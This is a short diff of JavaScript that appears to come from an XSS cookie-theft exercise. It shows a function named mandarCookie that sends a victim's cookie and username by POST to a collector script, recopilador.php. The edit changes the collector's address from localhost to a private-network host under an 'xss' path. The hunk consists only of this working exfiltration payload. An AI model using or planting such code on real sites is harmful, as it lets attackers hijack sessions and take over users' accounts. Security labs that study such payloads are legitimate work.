@@ -20,7 +20,7 @@ function mandarCookie(){
 	  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
 	}
 	var xmlhttp=new XMLHttpRequest();
-	xmlhttp.open("POST","localhost/receptor/recopilador.php",true);
+	xmlhttp.open("POST","http://172.16.170.8/xss/receptor/recopilador.php",true);
 	xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 	xmlhttp.send("cookie="+cookie+"&usuario="+usuario);
 }
